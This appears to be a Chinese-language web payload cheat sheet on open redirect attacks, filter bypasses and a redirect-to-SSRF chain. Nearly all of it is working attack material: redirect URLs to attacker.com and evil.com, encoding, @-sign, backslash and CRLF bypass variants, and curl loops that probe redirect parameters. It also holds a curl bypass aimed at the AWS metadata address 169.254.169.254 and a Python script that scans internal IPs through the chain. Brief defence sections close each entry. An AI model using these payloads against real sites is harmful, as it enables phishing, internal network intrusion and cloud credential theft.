# 开放重定向

_3 条 web payload_

### 基础开放重定向  `redirect-basic`
_URL跳转漏洞利用_
子类：**基础** · tags: `redirect` `url` `phishing`

**前置条件：**
- 目标参数控制跳转地址

**攻击链：**

**直接跳转**
> 直接跳转到攻击者站点
```
http://target.com/redirect?url=http://attacker.com
```
**语法解析：**
- `url=http://attacker.com` — 指定跳转目标 _parameter_

**绕过验证**
> @符号绕过
```
http://target.com/redirect?url=http://attacker.com@target.com
```
**语法解析：**
- `attacker.com@target.com` — 利用URL解析差异绕过 _value_

**斜杠绕过**
> //绕过协议
```
http://target.com/redirect?url=//attacker.com
```
**语法解析：**
- `//attacker.com` — 协议相对URL _value_

**WAF/EDR 绕过变体：**

**URL编码与双编码绕过**
> 通过URL编码、双重URL编码、Unicode同形字、CRLF注入等方式绕过跳转目标地址的白名单或黑名单检测
```
# URL编码:
/redirect?url=%68%74%74%70%3a%2f%2fattacker.com
# 双编码:
/redirect?url=%2568%2574%2574%2570%253a%252f%252fattacker.com
# Unicode编码:
/redirect?url=http://attacker。com
/redirect?url=http://ⓐttacker.com
# CRLF注入:
/redirect?url=%0d%0aLocation:%20http://attacker.com
```
**语法解析：**
- `# URL编码:` — 主要命令 _command_
- `...` — 共9行 _value_

**反斜杠与data: URI绕过**
> 利用反斜杠在不同解析器中的差异行为、data: URI协议、多斜杠协议相对URL等方式绕过域名白名单验证
```
# 反斜杠技巧:
/redirect?url=http://attacker.com@target.com
/redirect?url=//attacker.com
/redirect?url=/attacker.com

# data: URI:
/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# 协议相对URL变体:
/redirect?url=//attacker.com
/redirect?url=///attacker.com
/redirect?url=////attacker.com
```
**语法解析：**
- `# 反斜杠技巧:` — 主要命令 _command_
- `...` — 共10行 _value_


**概述：** 开放重定向漏洞允许攻击者通过篡改URL参数将用户从受信任的域名重定向到任意外部恶意网站，常被用于钓鱼攻击(利用受信任域名的可信度)、OAuth令牌窃取、绕过SSRF防护等场景，是社会工程学攻击的重要辅助手段

**漏洞原理：** 应用程序在处理重定向URL参数(如redirect_url、return_to、next等)时未对目标URL进行严格的白名单校验，仅做简单的域名包含检查(如检查是否包含trusted.com字符串)，可被攻击者通过URL编码、添加子域名(trusted.com.evil.com)、使用@符号(trusted.com@evil.com)等方式绕过

**利用方法：** 首先识别应用中所有重定向参数(通过爬虫、JS分析、登录/注销流程)，测试将重定向目标改为外部域名，如果被拦截则尝试绕过手法：双重URL编码、使用协议相对URL(//evil.com)、利用@符号(https://trusted.com@evil.com)、添加受信域名为子域(https://evil.com/trusted.com)、使用反斜杠(https://trusted.com\\@evil.com)等

**防御措施：** 实施严格的白名单校验，仅允许重定向到预定义的可信域名列表；使用相对路径而非完整URL进行站内重定向；对重定向URL参数进行签名防篡改；在重定向前向用户显示中间确认页面；Content Security Policy(CSP)配置navigate-to指令限制可导航域名

---

### 重定向绕过  `redirect-bypass`
_开放重定向绕过技巧_
子类：**Bypass** · tags: `redirect` `bypass`

**前置条件：**
- 存在重定向参数

**攻击链：**

**URL编码**
> 使用URL编码
```
redirect=http%3a%2f%2fattacker.com
```
**语法解析：**
- `%3a` — 冒号: _char_

**@符号**
> 利用URL认证部分
```
redirect=http://target.com@attacker.com
```
**语法解析：**
- `@` — 分隔用户信息和主机 _char_

**反斜杠**
> 使用反斜杠
_platform: windows_
```
redirect=https:/\attacker.com
```
**语法解析：**
- `redirect=https:/\attacker.com` — 命令/关键字 _command_

**WAF/EDR 绕过变体：**

**反斜杠路径规范化**
> 利用反斜杠在不同浏览器/服务器中的路径规范化差异绕过重定向域名白名单
```
# 反斜杠替代正斜杠
https://target.com/redirect?url=https://evil.com\@target.com
https://target.com/redirect?url=https:\\evil.com

# 路径穿越绕过域名白名单
https://target.com/redirect?url=https://target.com/..%2f@evil.com
https://target.com/redirect?url=//evil.com/%2f..%2f

# 协议相对URL
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=\\evil.com
```
**语法解析：**
- `# 反斜杠替代正斜杠` — 主要命令 _command_
- `...` — 共9行 _value_

**URL片段与参数注入**
> 利用URL片段标识符、参数污染和完整URL编码绕过服务端的重定向目标检查
```
# 片段标识符混淆
https://target.com/redirect?url=https://target.com#@evil.com
https://target.com/redirect?url=https://target.com%23@evil.com

# 参数污染
https://target.com/redirect?url=https://target.com&url=https://evil.com
https://target.com/redirect?url=https://target.com%26next=evil.com

# 编码混淆
https://target.com/redirect?url=https%3a%2f%2fevil.com
https://target.com/redirect?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
```
**语法解析：**
- `# 片段标识符混淆` — 主要命令 _command_
- `...` — 共9行 _value_

**空字节与特殊字符截断**
> 利用空字节截断URL校验、CRLF注入额外头部、特殊空白字符混淆URL解析
```
# 空字节截断
https://target.com/redirect?url=https://target.com%00@evil.com
https://target.com/redirect?url=https://evil.com%00.target.com

# 换行符注入
https://target.com/redirect?url=https://evil.com%0d%0aLocation:%20https://evil.com

# Tab/空格混淆
https://target.com/redirect?url=https://evil .com
https://target.com/redirect?url=java%09script:alert(1)
https://target.com/redirect?url=\x09javascript:alert(1)
```
**语法解析：**
- `# 空字节截断
https://target.com/redirect?url=https://target.com%00@evil.com
https://target.com/redirect?url=https://evil.com%00.target.com

# 换行符注入
https://target.com/redirect?url=https://evil.com%0d%0aLocation:%20https://evil.com

# Tab/空格混淆
https://target.com/redirect?url=https://evil .com
https://target.com/redirect?url=java%09script:alert(1)
https://target.com/redirect?url=\x09javascript:alert(1)` — 注入代码 _value_


**概述：** 开发者常通过正则或黑名单限制重定向，可被多种技巧绕过。

**漏洞原理：** 校验逻辑不严。

**利用方法：** 使用编码、特殊字符、IP格式绕过

**防御措施：** 白名单校验域名

---

### 重定向到SSRF  `redirect-ssrf`
_利用开放重定向漏洞作为跳板将SSRF探测引导到内部网络，绕过SSRF的URL白名单/黑名单限制_
子类：**SSRF** · tags: `redirect` `ssrf`

**前置条件：**
- 目标存在开放重定向(Open Redirect)漏洞
- 目标存在SSRF功能点(URL参数/Webhook等)
- SSRF过滤仅检查初始URL而不跟踪重定向

**攻击链：**

**识别开放重定向点**
> 寻找目标站点的开放重定向端点和参数
_platform: linux_
```
# 常见重定向参数:
curl -sI "http://target.com/redirect?url=https://evil.com" | grep -i location
curl -sI "http://target.com/login?next=https://evil.com" | grep -i location
curl -sI "http://target.com/goto?link=https://evil.com" | grep -i location

# 批量测试常见参数:
for param in url redirect next goto link return returnUrl callback dest destination rurl; do
  status=$(curl -sI "http://target.com/redirect?${param}=https://evil.com" -o /dev/null -w "%{http_code}")
  location=$(curl -sI "http://target.com/redirect?${param}=https://evil.com" | grep -i "^location:" | head -1)
  echo "${param}: HTTP ${status} → ${location}"
done
```
**语法解析：**
- `grep -i location` — 检查重定向的Location响应头 _command_
- `redirect,next,goto,link` — 常见的重定向参数名称 _value_

**通过重定向绕过SSRF过滤**
> 利用目标自身的重定向端点绕过SSRF的域名白名单限制
_platform: linux_
```
# 场景: SSRF接口检查URL域名白名单，但不检查重定向目标

# 正常SSRF请求(被拦截):
curl "http://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
# → 返回: "Blocked: internal IP"

# 通过重定向绕过:
# 1. 先确认重定向有效:
curl -sI "http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"

# 2. 将重定向URL作为SSRF输入:
curl "http://target.com/api/fetch?url=http://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"
# → SSRF过滤看到target.com(白名单内)，放行
# → 服务端跟随重定向到169.254.169.254
# → 返回AWS元数据
```
**语法解析：**
- `169.254.169.254` — AWS元数据服务地址(SSRF常用目标) _value_
- `http://target.com/redirect?url=` — 利用自身域名的重定向作为SSRF跳板 _value_

**短链接和DNS重绑定辅助**
> 使用短链接、自建重定向和DNS重绑定辅助SSRF绕过
```
# 如果目标站点没有开放重定向，使用外部服务:

# 1. 短链接服务重定向:
# 创建短链接指向内部IP: bit.ly/xxxxx → http://192.168.1.1
curl "http://target.com/api/fetch?url=https://bit.ly/xxxxx"

# 2. 自建重定向服务器:
# Python Flask:
# @app.route("/redirect")
# def redir():
#     return redirect("http://169.254.169.254/latest/meta-data/")
curl "http://target.com/api/fetch?url=http://attacker.com/redirect"

# 3. DNS重绑定:
# 使用rbndr.us等工具，DNS记录在attacker-IP和内部IP之间切换
# 第一次解析: attacker.com → 1.2.3.4 (通过IP检查)
# 第二次解析: attacker.com → 169.254.169.254 (实际请求)
curl "http://target.com/api/fetch?url=http://a]c0a80101.rbndr.us/"
```
**语法解析：**
- `bit.ly/xxxxx` — 短链接服务自动执行302重定向 _value_
- `rbndr.us` — DNS重绑定服务，交替解析到不同IP _value_
- `DNS重绑定` — 在IP验证和实际请求之间切换DNS解析结果 _value_

**完整利用链: 重定向→SSRF→内网探测**
> 利用重定向→SSRF链批量探测内部网络资源
```
# 完整攻击链:
import requests

TARGET = "http://target.com"
SSRF_URL = f"{TARGET}/api/fetch?url="
REDIR_URL = f"{TARGET}/redirect?url="

# 通过重定向探测内网:
internal_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
]

for internal in internal_targets:
    # 构造: SSRF → 重定向 → 内网目标
    payload = f"{SSRF_URL}{REDIR_URL}{internal}"
    try:
        r = requests.get(payload, timeout=5)
        if r.status_code == 200 and len(r.text) > 0:
            print(f"[+] FOUND: {internal}")
            print(f"    Response: {r.text[:200]}")
        else:
            print(f"[-] {internal}: HTTP {r.status_code}")
    except Exception as e:
        print(f"[!] {internal}: {e}")
```
**语法解析：**
- `SSRF_URL + REDIR_URL + internal` — 三层链式利用：SSRF接口→重定向→内网 _value_
- `timeout=5` — 设置超时避免内网不可达时长时间等待 _parameter_

**WAF/EDR 绕过变体：**

**URL解析差异利用**
> 利用不同URL解析库（cURL/urllib/Java URL）对authority/host部分解析的差异绕过SSRF白名单
```
# 利用URL解析库差异
http://evil.com#@target.com
http://evil.com\@target.com
http://target.com@evil.com

# 特殊URL格式
http://evil。com (全角句号)
http://ⓔⓥⓘⓛ.com (Unicode圆圈字符)
http://evil%E3%80%82com

# IPv6地址混淆
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```
**语法解析：**
- `# 利用URL解析库差异` — 主要命令 _command_
- `...` — 共11行 _value_

**DNS重绑定攻击**
> 通过DNS重绑定在URL校验和实际请求之间切换解析结果，绕过SSRF的IP黑名单
```
# DNS Rebinding攻击步骤
# 1. 配置DNS服务器交替返回不同IP
# evil.com -> 第1次解析: 公网IP（通过校验）
# evil.com -> 第2次解析: 127.0.0.1（实际请求）

# 使用rbndr.us自动DNS重绑定
http://7f000001.c0a80001.rbndr.us/internal

# 使用1u.ms
http://make-127.0.0.1-rr.1u.ms/admin

# TOCTOU: 检查时域名解析到白名单IP，请求时解析到内网IP
```
**语法解析：**
- `# DNS Rebinding攻击步骤` — 主要命令 _command_
- `...` — 共9行 _value_

**IP地址混淆表示**
> 使用十进制、八进制、十六进制和IPv6映射等不同方式表示内网IP绕过黑名单检查
```
# 十进制IP
http://2130706433  (= 127.0.0.1)
http://3232235777  (= 192.168.1.1)

# 八进制IP
http://0177.0.0.1  (= 127.0.0.1)
http://0x7f.0.0.1  (= 127.0.0.1)

# 混合进制
http://0177.0x0.0.1
http://127.1  (省略零段)
http://127.0.1

# IPv6映射
http://[::1]
http://[::]  (= 0.0.0.0)
http://[::ffff:7f00:1]
```
**语法解析：**
- `# 十进制IP` — 主要命令 _command_
- `...` — 共14行 _value_


**概述：** 重定向+SSRF组合攻击是一种高级SSRF绕过技术。当SSRF过滤仅检查初始URL的域名/IP(白名单)但服务端HTTP客户端会跟随302重定向时，攻击者可以利用目标自身的开放重定向端点作为跳板，将请求从白名单域名重定向到内网IP地址。

**漏洞原理：** 1) 目标存在开放重定向漏洞(未验证重定向目标) 2) SSRF功能的URL过滤仅检查初始请求的域名/IP 3) 服务端HTTP客户端自动跟随302/301重定向 4) 重定向后的请求不再经过URL过滤

**利用方法：** 利用流程：1) 找到开放重定向端点 2) 确认SSRF功能点 3) 构造重定向URL指向内网目标 4) 将重定向URL作为SSRF输入 5) 通过重定向绕过白名单访问内网

**防御措施：** 1) 修复所有开放重定向漏洞 2) SSRF过滤应在HTTP请求的每一跳进行 3) 禁用HTTP客户端的自动重定向跟随 4) 白名单+黑名单双重过滤 5) 网络层隔离SSRF功能所在的服务器

---
